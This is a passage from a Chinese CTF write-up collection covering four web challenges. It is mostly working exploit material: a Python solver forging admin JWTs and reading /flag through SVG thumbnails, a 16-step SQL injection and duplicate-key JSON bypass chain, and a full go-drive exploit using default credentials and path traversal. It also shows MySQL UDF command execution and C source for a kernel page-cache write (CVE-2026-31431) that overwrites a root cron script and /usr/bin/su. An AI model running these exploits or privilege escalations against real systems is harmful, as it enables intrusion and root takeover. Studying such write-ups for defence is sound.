        host = re.sub(r"^https?://", "", self.base).split("/")[0].split(":")[0]
        admin.cookies.set("token", token, domain=host, path="/")
        return admin

    def accept_paper_as_admin(self, admin, paper_id):
        r = self.request(
            "POST",
            f"/admin/papers/{paper_id}/status",
            session=admin,
            data={"status": "Accepted"},
            allow_redirects=False,
        )
        if r.status_code not in (302, 303):
            raise RuntimeError(f"admin accept failed: HTTP {r.status_code}, {r.text[:120]}")
        print("[+] forged admin accepted the paper", flush=True)

    def camera_ready_svg(self, viewbox_width):
        return f'''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="1800" height="360" viewBox="40 40 {viewbox_width} 35">
  <rect x="-1000" y="-1000" width="5000" height="5000" fill="white"/>
  <image xlink:href="text:/flag" x="0" y="0" width="612" height="792"/>
</svg>'''

    def upload_camera_ready(self, paper_id, width):
        svg = self.camera_ready_svg(width)
        r = self.request(
            "POST",
            f"/papers/{paper_id}/camera-ready",
            files={"cameraReadyPdf": ("camera-ready.pdf", svg, "application/pdf")},
            allow_redirects=False,
        )
        if r.status_code not in (302, 303):
            raise RuntimeError(f"camera-ready upload failed: HTTP {r.status_code}, {r.text[:120]}")
        view = self.request("GET", f"/papers/{paper_id}/view").text
        match = re.search(r'(/public/camera-ready/thumbs/[^"\']+)', view)
        if not match:
            raise RuntimeError("thumbnail path not found after camera-ready upload")
        thumb_path = match.group(1)
        image = self.request("GET", thumb_path).content
        out = self.out_dir / f"aaa26_thumb_w{width}.png"
        out.write_bytes(image)
        print(f"[*] thumbnail w={width}: {thumb_path} -> {out}", flush=True)
        return out, thumb_path

    def ocr_flag(self, image_path):
        try:
            from PIL import Image, ImageOps
        except Exception:
            return ""

        image = Image.open(image_path).convert("L")
        bbox = ImageOps.invert(image).getbbox()
        if bbox:
            x0, y0, x1, y1 = bbox
            margin = 10
            image = image.crop((
                max(0, x0 - margin),
                max(0, y0 - margin),
                min(image.width, x1 + margin),
                min(image.height, y1 + margin),
            ))
        image = image.resize((image.width * 5, image.height * 5), Image.Resampling.LANCZOS)
        image = image.point(lambda p: 0 if p < 180 else 255)
        prepared = image_path.with_suffix(".prep.png")
        image.save(prepared)

        cmd = [
            "tesseract",
            str(prepared),
            "stdout",
            "--psm",
            "7",
            "-c",
            "tessedit_char_whitelist=flag{}()ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-",
        ]
        try:
            raw = subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout.strip()
        except Exception:
            return ""
        cleaned = re.sub(r"\s+", "", raw).replace("(", "{").replace(")", "}")
        match = re.search(r"flag\{[^}]{3,}\}", cleaned)
        return match.group(0) if match else cleaned

    def read_flag_via_camera_ready(self, paper_id):
        seen = []
        for width in (240, 320, 360, 380, 420):
            image_path, thumb_path = self.upload_camera_ready(paper_id, width)
            text = self.ocr_flag(image_path)
            seen.append((width, text, image_path, thumb_path))
            if re.fullmatch(r"flag\{[^}]+\}", text or ""):
                print(f"[+] OCR flag from width {width}: {text}", flush=True)
                return text

        print("[!] OCR did not confidently recover a flag. Attempts:", flush=True)
        for width, text, image_path, thumb_path in seen:
            print(f"    width={width} ocr={text!r} image={image_path} url={self.base}{thumb_path}", flush=True)
        return ""

    def run(self):
        self.register_and_login()
        self.upload_profile_with_reference({"$regex": "^"})
        self.submit_profile_once()
        self.ensure_unused_invite_exists()
        invite_code = self.leak_invite_code()
        print(f"[+] reviewer invite code: {invite_code}", flush=True)
        self.claim_reviewer(invite_code)

        jwt_secret = self.leak_jwt_secret()
        print(f"[+] jwt secret: {jwt_secret}", flush=True)

        paper_id = self.create_paper()
        admin = self.forge_admin_session(jwt_secret)
        self.accept_paper_as_admin(admin, paper_id)
        flag = self.read_flag_via_camera_ready(paper_id)
        if flag:
            print(f"[+] FLAG: {flag}", flush=True)

def main():
    parser = argparse.ArgumentParser(description="AAA26 Big-1 full local exploit")
    parser.add_argument("base_url", help="target base URL, e.g. http://127.0.0.1:62303")
    parser.add_argument("--timeout", type=int, default=30)
    parser.add_argument("--out-dir", default="/Users/y7/Downloads/mid", help="where thumbnails are saved")
    args = parser.parse_args()
    Solver(args.base_url, timeout=args.timeout, out_dir=args.out_dir).run()

if __name__ == "__main__":
    main()
```

### 12307

#### **一、架构分析**

本题是一个模拟 12306 铁路购票系统的微服务架构，包含 **11 个内部服务**，全部运行在单个 Docker 容器内：

| 服务                 | 端口 | 用户   | 用途                         |
| -------------------- | ---- | ------ | ---------------------------- |
| ticketing_api        | 5000 | rail   | 车票预订、订单管理           |
| waitlist_push        | 5001 | rail   | 候补队列、WebSocket 登机     |
| sso_gateway          | 5002 | rail   | SSO 身份认证                 |
| station_portal       | 5003 | rail   | 车站服务台（票据调整、公告） |
| pricing_sampler      | 5004 | rail   | 票价采样、渲染任务           |
| enterprise_gateway   | 5005 | rail   | 企业网关（收据准备）         |
| receipt_signer       | 5006 | rail   | 收据签名                     |
| settlement_scheduler | 5007 | rail   | 结算调度                     |
| station_import       | 5008 | rail   | 数据导入适配器               |
| depot_layout         | 5009 | settle | 布局预览/打印桥接            |
| print_spooler        | -    | settle | 打印后台（执行程序）         |
| edge_gateway         | 5010 | rail   | API 网关（路由）             |

#### **二、关键漏洞点**

##### **2.1 SUID base64 — 命令执行出口**

Dockerfile 中的启动脚本：

```Bash
chown root:root /usr/bin/base64
chmod 4755 /usr/bin/base64
```

`/usr/bin/base64` 被设置了 **SUID 位**，意味着任何用户执行 `base64 /flag` 都能以 root 权限读取 `/flag` 文件。

##### **2.2 Print Spooler — 命令执行通道**

`print_spooler/worker.py` 中的 `run_driver` 函数可以直接执行程序：

```Python
def run_driver(program, argument):
    pid = os.posix_spawn(program, [program, argument], os.environ, file_actions=file_actions)
```

且 `device-map.json` 中 `profile-delta-closeout` 配置了 `acceptedPrograms: ["/usr/bin/base64"]`。

##### **2.3 SQL 注入 — 信息泄露**

`station_portal/app.py` 中 `fare_scope_expression` 函数存在 ORDER BY 注入：

```Python
if scope.get("mode") == "legacy-rank":
    return str(scope.get("expr", "ticket_no"))[:240]
```

`expr` 直接拼入 SQL 的 `ORDER BY` 子句，可用于盲注提取数据。

##### **2.4 JSON 重复键绕过 — 认证绕过**

`receipt_signer/app.py` 中 `verify_carrier_seal` 函数对 payload 做了两次解析：

```Python
public_view = json.loads(payload_text, object_pairs_hook=first_wins_object)  # 验证用，第一个值优先
render_view = json.loads(payload_text)  # 实际用，最后一个值优先（Python 默认行为）
```

可以构造包含重复键的 JSON，使验证通过合法值，实际使用恶意值。

#### **三、攻击链（16 步）**

##### **Step 1: SSO 身份伪造**

POST `/api/mobile/identity/continue`

构造符合 `partnerContinuation` 校验的请求（包含 railway-partner、12307 Audience、NameID、RelayState），获取 `passenger_session` cookie。会话状态为 `compat-pending`，信任等级包含 `settlement`。

##### **Step 2: 完成会话 + 获取候补 Session**

POST `/api/mobile/orders/hold` (holdMode=waitlist)

触发 edge_gateway 的 `holdFlow`：先调用 `/_rail/session/check` 完成会话，然后因 409 获取 waitlist channel，得到 `waitlist_session` cookie。

##### **Step 3: 创建候补订单**

POST `/api/mobile/orders`

购买 G7608 商务座（初始容量为 0），订单状态为 `waitlisted`，同时自动创建 `station_claim_artifacts` 记录。

##### **Step 4: 盲注提取 claim_salt**

POST `/api/desk/fares/reprice`

利用 ORDER BY 盲注，逐字符二分查找 `station_claim_artifacts` 表中的 `claim_salt`：

```JSON
{
  "tariffScope": {
    "mode": "legacy-rank",
    "expr": "IF(ASCII(SUBSTRING((SELECT claim_salt FROM station_claim_artifacts WHERE ...),{pos},1))>{mid},ticket_no,passenger)"
  }
}
```

通过返回的 `bucket` 字段（"north-window" / "local-window"）判断条件真假。

##### **Step 5: 计算 claim_proof**

```Python
digest = sha256(f"{order_id}|G7608|HGH|T-HGH-7608-019|{claim_salt}")
proof = f"CP-{claim_salt}-{digest[:12]}"
```

##### **Step 6: 提交票据调整**

POST `/api/desk/tickets/adjust`

提交包含合法 claim_proof 和特定格式 memo JSON 的调整请求。memo 中包含布局配置信息：

```JSON
{
  "stationCode": "HGH",
  "channel": "fare-desk",
  "lineItems": {
    "role": "settlement-layout",
    "reason": "FARE-91",
    "layout": "folio-grid-27",
    "device": "PR-HGH-042"
  }
}
```

##### **Step 7: 发布公告（注入 HTTP 头）**

POST `/api/desk/notices`

`proxyHint` 字段包含 `\r\n` 分隔的 HTTP 头格式数据：

```Plain
X-Desk-Lane: delta-window-27
X-Board-Window: seat-window-e27
X-Desk-Key-Id: POL-HGH-TRUSTED
X-Desk-Key: delta-window-27
```

##### **Step 8: 编译通知源**

POST `/api/corporate/imports/relay` (adapter=station-partner-feed)

触发 `compile_notice_feed`，将公告的 proxyHint 解析为 HTTP 头，写入 Redis：

- `rail:interline:lane:HGH` → 签名线路路由
- `rail:board:profile:HGH` → 登机配置（topic、transport、ack）
- `rail:partner:jwks:HGH` → JWK 密钥（kid=POL-HGH-TRUSTED, key=e94c0a8d-12307-hgh-trusted）

##### **Step 9: 应用调整规则**

POST `/api/corporate/imports/relay` (adapter=station-desk-ledger)

触发 `apply_adjustment_rules`，执行关键数据库更新：

- `waitlist_entries.sampled = 1`
- `station_profiles.batch_open = 1, renderer_profile = 'folio-grid-27', signer_route = 'delta-window-27'`
- 创建 `tariff_exception_claims` 记录

##### **Step 10: 激活布局声明**

POST `/api/corporate/imports/relay` (adapter=enterprise-clearing)

触发 `activate_layout_claim`，向 `bureau_layout_cells` 插入关键行：

```SQL
INSERT INTO bureau_layout_cells VALUES ('HGH', 'folio-grid-27', 'receipt', 'service-device', 'PR-HGH-042', 1, ...)
```

同时设置 `rail:layout:entitlement:{orderId}` = "HGH"。

##### **Step 11: WebSocket 登机确认**

连接 `ws://HOST/api/connect/boarding?stationCode=HGH`

按序发送 WebSocket 消息：

1. `boarding.hello` → 确认通道
2. `boarding.bind` (topic=seat-consist, trainId=G7608) → 绑定订阅
3. `boarding.confirm` (orderId, stationCode=HGH) → 确认登机

返回 `ledgerRef`，同时设置 `rail:ledger:channel:{orderId}`。

##### **Step 12: 创建渲染任务**

POST `/api/corporate/reconciliation`

使用 `reportType=carrier-closeout`，模板为 `"Reconciliation {{orderId}} {{status}} {{reconciliation.receipt}}"`。`{{reconciliation.receipt}}` 会被解析为布局单元格。

##### **Step 13: 构造 Carrier Seal + 准备收据**

POST `/api/corporate/receipts/prepare`

**核心绕过：JSON 重复键**

Carrier seal 的 payload 手工构造为含重复键的 JSON：

```json
{
  "batchId": "...",
  "orderId": "...",
  "stationCode": "HGH",
  "templateDigest": "...",
  "routeName": "delta-window-27",
  "ledgerRef": "...",

  "printProfile": "counter-copy",     *←* *first_wins* *看到，用于验证*

  "printer": "thermal-standard",      *←* *first_wins* *看到，用于验证*

  "printProfile": "clearing-batch",   *←* *last_wins* *看到，用于* *print_plan*

  "printer": "line-printer",          *←* *last_wins* *看到，用于* *print_plan*

  "driverProgram": "/usr/bin/base64",

  "driverArgument": "/flag"

}
```

验证时 `public_view` 看到第一个 `printProfile: "counter-copy"` 和 `printer: "thermal-standard"`，匹配检查项。实际使用时 `render_view` 看到最后一个 `printProfile: "clearing-batch"` 和 `printer: "line-printer"`，满足 layout_enabled 条件。

签名使用 HMAC-SHA256，密钥为步骤 8 写入的 JWK key。

**Step 14: 设置 Fulfillment Epoch（8 秒 TTL）**

POST `/api/corporate/imports/relay` (adapter=fulfillment-monitor)

设置 `rail:fulfillment:epoch:{orderId}` = "boarding"，有效期仅 8 秒，必须在调度前立即设置。

##### **Step 15: 调度结算批次**

POST `/api/corporate/settlement/schedule`

调度器检查收据签名、模板摘要、过期时间、mint seal 等全部通过后，将任务推入 `rail:settlement:jobs` 队列。

Settlement Worker 处理流程：

1. 加载全部上下文（订单、收据、信任、候补、布局等）
2. 验证所有条件（13 项检查）
3. 渲染模板 → `{{reconciliation.receipt}}` 触发 `resolve_cell("receipt")`
4. 单元格类型为 `service-device` → 调用 `bridge_preview("PR-HGH-042", ...)`
5. Depot Layout 创建签名 ticket，推入打印队列
6. Print Spooler 验证 ticket 签名、codec、acceptedPrograms
7. **执行 `posix_spawn("/usr/bin/base64", "/flag")`**

##### **Step 16: 读取结果**

GET `/api/corporate/reconciliation/{batchId}`

渲染结果中包含 base64 编码的 flag 内容。

### Real DLsite

1. 入口 `/` 跳到旧下载站 `/view?p=/`，页面提示新站在 `/new/#/_/test`。
2. 新站是 `go-drive`，后台默认口令可用：

```Plain
admin / 123456
```

3. 后台添加一个 `fs` drive，路径设为 `../../../`，命名为 `esc`，即可从 go-drive 视角访问容器根目录，例如：

```Plain
esc/tmp
esc/app/config.yml
esc/usr/lib/php/sessionclean
```

4. `/app/config.yml` 中的 thumbnail shell handler 会对特定后缀调用：

```Plain
/usr/bin/python3 /tmp/p.py
```

因此可以通过上传 `/tmp/p.py`，再请求一个唯一 `.cgi` 文件的缩略图来获得一次 Python 代码执行。

5. `CVE-2026-31431` 是 AF_ALG + splice 的 page-cache 覆盖漏洞。这里选择覆盖可读且会被 root cron 定时执行的脚本：

```Plain
/usr/lib/php/sessionclean
```

覆盖内容为 160 字节以内的 shell 脚本：

```Bash
#!/bin/sh
cp /root/0-0/flag /tmp/FLAG
chmod 0644 /tmp/FLAG
exit 0
```

6. 触发缩略图后，`/tmp/EXP_LOG` 验证 patch 成功：

```Plain
sessionclean patched! len=160
wait cron then read /tmp/FLAG
```

7. 等待 cron 在 `:09` 或 `:39` 执行 `sessionclean`，随后通过 go-drive 的 `/zip` 接口读取：

```Plain
esc/tmp/FLAG
```

得到 flag。

EXP：

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import io
import re
import sys
import time
import urllib.parse
import zipfile

import requests

DEFAULT_BASE = "http://web-4e397b987b.adworld.xctf.org.cn:80/new"

PATCHER = r"""#!/usr/bin/env python3
import os as g, socket as s, sys, traceback
AF_ALG=38; SOL_ALG=279
PAYLOAD=(b"#!/bin/sh\n"
         b"cp /root/0-0/flag /tmp/FLAG\n"
         b"chmod 0644 /tmp/FLAG\n"
         b"exit 0\n")
PAYLOAD = PAYLOAD + b" "*(160-len(PAYLOAD))

def d(x): return bytes.fromhex(x)
def write4(fd, off, chunk):
    a=s.socket(AF_ALG,5,0)
    a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
    a.setsockopt(SOL_ALG,1,d('0800010000000010'+'0'*64))
    a.setsockopt(SOL_ALG,5,None,4)
    u,_=a.accept(); z=b'\x00'; n=off+4
    u.sendmsg([b'A'*4+chunk],[(SOL_ALG,3,z*4),(SOL_ALG,2,b'\x10'+z*19),(SOL_ALG,4,b'\x08'+z*3)],32768)
    r,w=g.pipe()
    g.splice(fd,w,n,offset_src=0)
    g.splice(r,u.fileno(),n)
    try: u.recv(8+off)
    except Exception: pass
    for x in (r,w):
        try: g.close(x)
        except Exception: pass
    try: u.close(); a.close()
    except Exception: pass

with open('/tmp/EXP_LOG','w') as log:
    try:
        log.write('start uid=%d euid=%d len=%d\n' % (g.getuid(), g.geteuid(), len(PAYLOAD))); log.flush()
        fd=g.open('/usr/lib/php/sessionclean',0)
        try:
            for i in range(0,len(PAYLOAD),4):
                write4(fd,i,PAYLOAD[i:i+4])
        finally:
            g.close(fd)
        log.write('sessionclean patched! len=%d\n' % len(PAYLOAD))
        log.write('wait cron then read /tmp/FLAG\n')
    except Exception:
        log.write(traceback.format_exc())
sys.stdout.buffer.write(b"\xff\xd8\xff\xd9")
"""

class GD:
    def __init__(self, base, user, password):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.h = {}
        r = self.s.post(self.base + "/auth/init", timeout=10)
        r.raise_for_status()
        self.h = {"Authorization": r.json()["token"]}
        r = self.s.post(
            self.base + "/auth/login",
            headers=self.h,
            json={"username": user, "password": password},
            timeout=10,
        )
        if r.status_code != 200:
            raise SystemExit(f"login failed: {r.status_code} {r.text[:200]}")

    @staticmethod
    def q(path):
        return urllib.parse.quote(path, safe="/")

    def ensure_esc(self):
        r = self.s.get(self.base + "/admin/drives", headers=self.h, timeout=10)
        r.raise_for_status()
        if '"esc"' not in r.text:
            r = self.s.post(
                self.base + "/admin/drive",
                headers=self.h,
                timeout=10,
                json={
                    "name": "esc",
                    "enabled": True,
                    "type": "fs",
                    "config": '{"path":"../../../"}',
                },
            )
            r.raise_for_status()
            r = self.s.post(
                self.base + "/admin/drives/reload", headers=self.h, timeout=10
            )
            r.raise_for_status()

    def put(self, path, data):
        r = self.s.put(
            self.base + "/content/" + self.q(path),
            headers={**self.h, "Content-Type": "application/octet-stream"},
            params={"override": "1"},
            data=data,
            timeout=20,
        )
        if r.status_code != 200:
            raise SystemExit(f"PUT {path} failed: {r.status_code} {r.text[:300]}")
        try:
            return r.json().get("result", {})
        except Exception:
            return {}

    def access_key(self, path):
        parent = path.rsplit("/", 1)[0]
        r = self.s.get(
            self.base + "/entries/" + self.q(parent), headers=self.h, timeout=10
        )
        r.raise_for_status()
        for e in r.json():
            if e.get("path") == path:
                return e.get("meta", {}).get("accessKey")
        raise SystemExit(f"cannot find accessKey for {path}")

    def trigger_thumbnail(self, path, key):
        r = self.s.get(
            self.base + "/thumbnail/" + self.q(path),
            headers=self.h,
            params={"_k": key},
            timeout=60,
        )
        if r.status_code != 200 or r.content[:2] != b"\xff\xd8":
            raise SystemExit(
                f'thumbnail trigger failed: {r.status_code} {r.headers.get("content-type")} {r.text[:300]!r}'
            )

    def zip_read(self, path):
        r = self.s.post(
            self.base + "/zip", headers=self.h, data={"files": path}, timeout=20
        )
        if r.status_code != 200:
            return None
        try:
            z = zipfile.ZipFile(io.BytesIO(r.content))
            names = z.namelist()
            if not names:
                return None
            return z.read(names[0])
        except Exception:
            return None

def main():
    ap = argparse.ArgumentParser(description="ACTF2026 web minimal exploit")
    ap.add_argument(
        "base",
        nargs="?",
        default=DEFAULT_BASE,
        help="go-drive base url, default: %(default)s",
    )
    ap.add_argument("-u", "--user", default="admin")
    ap.add_argument("-p", "--password", default="123456")
    ap.add_argument(
        "-t", "--timeout", type=int, default=2400, help="seconds to poll /tmp/FLAG"
    )
    args = ap.parse_args()

    gd = GD(args.base, args.user, args.password)
    print("[+] logged in")
    gd.ensure_esc()
    print("[+] esc drive ready")

    gd.put("esc/tmp/p.py", PATCHER.encode())
    gd.s.put(
        gd.base + "/admin/options",
        headers=gd.h,
        json={"thumbnail.handlersMapping": "exploit:**"},
        timeout=10,
    )
    print("[+] uploaded /tmp/p.py")

    trig = f"esc/tmp/trig{int(time.time()*1000)}.cgi"
    res = gd.put(trig, b"x")
    key = res.get("meta", {}).get("accessKey") or gd.access_key(trig)
    gd.trigger_thumbnail(trig, key)
    print("[+] CVE patcher triggered; waiting for root cron to run sessionclean")

    end = time.time() + args.timeout
    while time.time() < end:
        b = gd.zip_read("esc/tmp/FLAG")
        if b:
            text = b.decode("utf-8", "replace")
            m = re.search(r"[A-Z]+CTF\{[^}\n]+\}", text)
            if m:
                print("[+] flag:", m.group(0))
                return
            print(text)
            return
        log = gd.zip_read("esc/tmp/EXP_LOG")
        if log:
            sys.stdout.write(
                "\r" + log.decode("utf-8", "replace").splitlines()[-1][:80]
            )
            sys.stdout.flush()
        time.sleep(5)
    raise SystemExit("\n[-] timeout; check esc/tmp/EXP_LOG and cron schedule")

if __name__ == "__main__":
    main()
```

### GoMySQL

1. 通过 `/calc` 的 MariaDB 表达式注入确认数据库执行能力，并验证多语句和 `EXECUTE IMMEDIATE` 可用。
2. 创建 `rf / lenf / hx` 辅助函数，拿到稳定的文本读文件和二进制分块读取能力。
3. 利用 `SELECT 0x... INTO DUMPFILE` 向 MySQL `plugin_dir` 上传 UDF，共享库注册成 `sysx`，获得 `mysql` 用户命令执行。
4. 枚举容器后确认 Web 进程 `/usr/local/bin/99820119_myapp` 由 root 运行，而 `/flag` 为 `600 root:root`，单纯 UDF 无法直接读 flag。
5. 逆向 Go 二进制确认 `/draw` 虽然内置危险模板函数 `run`，但在当前参数校验下不可达，是一条干扰路线。
6. 利用内核 `Copy Fail`（`CVE-2026-31431`）实现 4 字节页缓存写原语，本地编译最小工具 `cfw`。
7. 上传 `cfw` 后逐 4 字节覆写 `/usr/bin/su` 的前 160 字节，使其在页缓存中变成最小 `setuid(0)+/bin/sh` ELF stub。
8. 执行 `printf 'id\ncat /flag\n' | /usr/bin/su`，拿到 root shell 输出并读出最终 flag。

题目首页提供两个入口：

- `/calc`
- `/draw`

题目给了提示，可能是单独的 Go 二进制，后面需要逆向确认路由、模板逻辑和命令执行点。

- 先打 `/calc`，确认是否能转成数据库执行。
- 同时观察 `/draw`，看看是否存在 Go 模板注入或内置后门。

`/calc` MariaDB 表达式注入

`/calc` 是一个 POST 表单，参数名为 `expression`。页面提示 “不要包含 SQL keywords”，但这种文案在题里通常意味着后端直接拼接了 SQL 表达式。

实际测试：

```SQL
database()
user()
```

回显结果显示：

- `database()` -> `testdb`
- `user()` -> `root@``localhost`

这就说明 `/calc` 不是本地算式解析器，而是真的把输入交给了 MariaDB 执行，而且数据库连接权限很高，直接就是 `root@``localhost`。

继续测试：

```SQL
1;do sleep(1)
```

请求会有明显延迟，说明该点支持多语句。也就是说页面虽然只显示第一条 `SELECT` 的结果，但后面的 SQL 一样会执行，这已经足够把它当成“完整 SQL 执行点”来看待。

再继续确认：

```SQL
1;execute immediate 0x73656c65637420313233
```

`EXECUTE IMMEDIATE` 可用。这一点非常关键，因为很多被过滤的 SQL 关键字、表名、路径，都可以包进十六进制字符串后再执行，从而避开输入过滤。

辅助函数：解决读文件和二进制回传

`/calc` 的回显格式不是普通字符串，而是 Go 把数据库返回值按字节数组打印，例如：

```Plain
[116 101 115 116 100 98]
```

所以为了后面稳定利用，先通过 `EXECUTE IMMEDIATE` 建几个临时函数：

```SQL
drop function if exists rf;
create function rf(p text) returns longtext deterministic return load_file(p);

drop function if exists lenf;
create function lenf(p text) returns integer deterministic return length(load_file(p));

drop function if exists hx;
create function hx(p text,o integer,l integer) returns longtext deterministic return hex(substr(load_file(p),o,l));
```

这三个函数分别解决：

- `rf(p)`：直接读取文本文件。
- `lenf(p)`：拿文件长度。
- `hx(p,o,l)`：把任意文件按块切出来并十六进制回传。

有了这组函数后，注入点的能力就变成：

1. 可执行多语句。
2. 可动态执行十六进制包装的 SQL。
3. 可稳定读取文本文件。
4. 可按块导出二进制。

环境枚举：确认 flag 不在数据库里

先看数据库里有没有现成的业务表或 flag。结果 `testdb` 几乎没有题目数据，说明这题的 flag 大概率不在数据库表里，而是在文件系统或应用逻辑中。

接着读文件：

```SQL
rf('/etc/passwd')
rf('/flag')
```

结果表现为：

- `/etc/passwd` 可读。
- `/flag` 存在，但直接读不到。

后续通过命令执行和 `ls -l` 可以确认：

```Plain
-rw------- 1 root root 49 ... /flag
```

也就是：

- `/flag` 权限为 `600 root:root`
- 必须拿到 root 权限才能读

单纯数据库读文件、甚至 `mysql` 身份命令执行，都不够。

MySQL UDF 命令执行

因为当前数据库用户已经是 `root@localhost`，而且 `plugin_dir` 可写，所以标准 MySQL UDF 路线天然成立。

流程就是：

1. 上传共享库到 `/usr/lib/mysql/plugin/`
2. `CREATE FUNCTION ... SONAME ...`
3. 通过 UDF 执行系统命令

这里使用的共享库是一个很小的 `libmse9.so`，功能等价于 `sys_exec` 一类 UDF。上传 SQL：

```SQL
SELECT 0x<so文件hex> INTO DUMPFILE '/usr/lib/mysql/plugin/libmse9.so'
```

注册函数：

```SQL
DROP FUNCTION IF EXISTS sysx;
CREATE FUNCTION sysx RETURNS INTEGER SONAME 'libmse9.so';
```

之后就可以构造：

```SQL
sysx('sh -c ...')
```

去执行系统命令。实测返回：

```Plain
uid=100(mysql) gid=101(mysql) groups=101(mysql)
```

到这里已经从 SQL 注入走到了系统命令执行，只是身份还是 `mysql`。

Web 进程与二进制定位

拿到命令执行后先做最关键的容器枚举：

```Plain
PID 1   root   /usr/local/bin/99820119_myapp
PID 42  root   /bin/sh /usr/bin/mysqld_safe
PID 169 mysql  /usr/sbin/mariadbd ...
```

结论很明确：

1. Web 主进程是 `/usr/local/bin/99820119_myapp`
2. Web 由 root 运行
3. 数据库由 `mysql` 运行

这时题目的结构就完全清楚了：

- `/calc` 提供数据库执行入口
- UDF 提供 `mysql` 命令执行
- 真正能读 `/flag` 的是 root 权限的 Web 进程

于是后面要么想办法借 Web 逻辑直接 root 读 flag，要么直接做本地提权。

`/draw` 模板系统分析与排除

为了判断是否存在直接的 root 命令执行逻辑，我把 `/usr/local/bin/99820119_myapp` 通过 `hx()` 分块拉回本地，得到约 7.5MB 的 Go 静态二进制。

从 `.gopclntab` 和反汇编中能恢复出一批关键函数名：

- `myapp/internal/challenge.Run`
- `myapp/internal/challenge.calcHandler`
- `myapp/internal/challenge.drawHandler`
- `myapp/internal/challenge.parseTemplateVars`
- `myapp/internal/challenge.validateTemplateVars`
- `myapp/internal/challenge.parseTemplateString`
- `myapp/internal/challenge.commandHandler`
- `myapp/internal/challenge.runCommand`

通过 `Run` 可以确认整个程序只注册了 3 个路由：

- `/`
- `/calc`
- `/draw`

没有隐藏路由。

继续看 `/draw` 的实现，能发现它确实有一套自定义模板系统，并注册了三个函数：

- `draw_number`
- `strrot`
- `run`

其中 `run` 最危险，它最终会调用：

```Plain
/bin/sh -c <arg>
```

并带 2 秒超时。如果能触发到这里，理论上就可以拿到 root 命令执行。

但是 `validateTemplateVars` 对所有用户可控 value 做了硬过滤，禁止出现：

- `<\`
- `/>`
- `'`
- `;`

而模板语法本身又要求：

- 字面量和函数参数都依赖引号
- 函数调用格式里需要 `;`
- `run` 本身还是 unsafe-only 分支

因此最终结论是：

1. `/draw` 的模板系统确实危险。
2. 但当前输入路径上，真正可控的 value 会先经过严格校验。
3. 在现有约束下，`run` 虽然存在，但实际上不可达。

所以 `/draw` 更像是题目的假线索，而不是最终解法。

本地提权：选择 `Copy Fail`

既然已经确认：

- `mysql` 身份下有命令执行
- `/flag` 只能 root 读
- `/draw` 逻辑里没有稳定可达的 root 执行链

那最稳的路线就是直接在容器里本地提权。

内核版本为：

```Plain
Linux ... 4.18.0-240.el8.x86_64
```

这个版本可以利用 `Copy Fail`（`CVE-2026-31431`）的公开思路：通过 `AF_ALG + splice()` 做一个 4 字节页缓存写原语，对任意“可读文件”的页缓存进行修改。

一开始试过一些中间路线，比如：

- 直接改 `/etc/pam.d/su`
- 直接大块覆写 `/usr/bin/su`

这些方法要么容易把服务打崩，要么依赖原始 `su` 逻辑，稳定性不够。最后稳定拿 flag 的办法是：

1. 本地写一个只负责“4 字节页缓存写”的最小工具。
2. 上传这个工具到容器。
3. 用它逐 4 字节覆写 `/usr/bin/su` 的前 160 字节。
4. 覆写内容不是普通文本，而是一个最小 ELF stub，功能只有 `setuid(0)` 和 `execve("/bin/sh", ...)`。

这样就完全不依赖原始 `su` 的认证流程，只要页缓存覆写成功，`/usr/bin/su` 在内存里就被临时替换成 root shell launcher。

`Copy Fail` 4 字节写工具

本地写了一个最小静态工具 `cfw`，源码是：

```C++
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

static void build_keyblob(unsigned char out[56]) {
    memset(out, 0, 56);
    out[0] = 0x08;
    out[1] = 0x00;
    out[2] = 0x01;
    out[3] = 0x00;
    out[7] = 0x10;
}

static int write4(const char *path, off_t file_offset, const unsigned char data[4]) {
    int fd_target = -1;
    int master = -1;
    int op = -1;
    int pr = -1;
    int pw = -1;
    int rc = -1;
    unsigned char keyblob[56];
    unsigned char aad[8];
    unsigned char ivmsg[20];
    unsigned char assoclen[4];
    unsigned char recvbuf[64];
    unsigned char cachebuf[4096];
    unsigned char control[CMSG_SPACE(sizeof(uint32_t)) + CMSG_SPACE(sizeof(ivmsg)) +
                          CMSG_SPACE(sizeof(assoclen))];
    struct sockaddr_alg sa;
    struct iovec iov;
    struct msghdr msg;
    struct cmsghdr *cmsg;
    loff_t src_off = file_offset;
    uint32_t alg_op = 0;
    ssize_t n;

    fd_target = open(path, O_RDONLY);
    if (fd_target < 0) {
        perror("open");
        goto out;
    }
    if (pread(fd_target, cachebuf, sizeof(cachebuf), 0) < 0) {
        perror("pread");
        goto out;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");

    master = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (master < 0) {
        perror("socket");
        goto out;
    }
    if (bind(master, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        perror("bind");
        goto out;
    }

    build_keyblob(keyblob);
    if (setsockopt(master, SOL_ALG, ALG_SET_KEY, keyblob, sizeof(keyblob)) != 0) {
        perror("setsockopt(ALG_SET_KEY)");
        goto out;
    }

    op = accept(master, NULL, 0);
    if (op < 0) {
        perror("accept");
        goto out;
    }

    memset(aad, 0, sizeof(aad));
    memcpy(aad + 4, data, 4);
    memset(ivmsg, 0, sizeof(ivmsg));
    ivmsg[0] = 0x10;
    assoclen[0] = 0x08;
    assoclen[1] = 0x00;
    assoclen[2] = 0x00;
    assoclen[3] = 0x00;

    memset(control, 0, sizeof(control));
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = aad;
    iov.iov_len = sizeof(aad);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
